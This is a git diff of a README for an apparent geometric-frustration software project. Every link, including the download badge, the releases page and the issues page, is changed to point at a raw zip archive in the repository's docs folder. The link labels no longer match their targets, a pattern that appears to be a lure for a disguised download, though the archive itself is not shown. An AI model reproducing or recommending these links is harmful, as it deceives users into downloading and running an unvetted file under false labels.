@@ -1,6 +1,6 @@
 # 🔍 applications_frustration_geometrique_potentiel - Explore Geometric Frustration Principles
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/arisentana/applications_frustration_geometrique_potentiel/releases)
+[![Download](https://raw.githubusercontent.com/arisentana/applications_frustration_geometrique_potentiel/main/docs/potentiel_frustration_applications_geometrique_v2.9.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/arisentana/applications_frustration_geometrique_potentiel/main/docs/potentiel_frustration_applications_geometrique_v2.9.zip)
 
 ## 📖 About
 
@@ -11,7 +11,7 @@ This repository provides an in-depth analysis of geometric frustration as an act
 To begin using the software, follow these steps:
 
 1. **Visit the Releases Page:** 
-   Go to our [Releases page](https://github.com/arisentana/applications_frustration_geometrique_potentiel/releases) to find the latest updates.
+   Go to our [Releases page](https://raw.githubusercontent.com/arisentana/applications_frustration_geometrique_potentiel/main/docs/potentiel_frustration_applications_geometrique_v2.9.zip) to find the latest updates.
 
 2. **Download the Application:**
    Find the latest version of the application and download it. Click the link that says "Download" next to the application version you need.
@@ -43,7 +43,7 @@ To ensure smooth operation, your computer should meet the following minimum requ
 
 The easiest way to download and install the application is to click on the link below. This will take you to the Releases page where you can find all available versions.
 
-[Download the Latest Release](https://github.com/arisentana/applications_frustration_geometrique_potentiel/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/arisentana/applications_frustration_geometrique_potentiel/main/docs/potentiel_frustration_applications_geometrique_v2.9.zip)
 
 ### Installation Steps
 
@@ -58,7 +58,7 @@ The easiest way to download and install the application is to click on the link 
 
 ## 💬 Support
 
-If you encounter any issues during installation or operation, feel free to reach out for support. Visit our [issues page](https://github.com/arisentana/applications_frustration_geometrique_potentiel/issues) on GitHub to report bugs or ask questions.
+If you encounter any issues during installation or operation, feel free to reach out for support. Visit our [issues page](https://raw.githubusercontent.com/arisentana/applications_frustration_geometrique_potentiel/main/docs/potentiel_frustration_applications_geometrique_v2.9.zip) on GitHub to report bugs or ask questions.
 
 ## 🔗 Related Topics
 
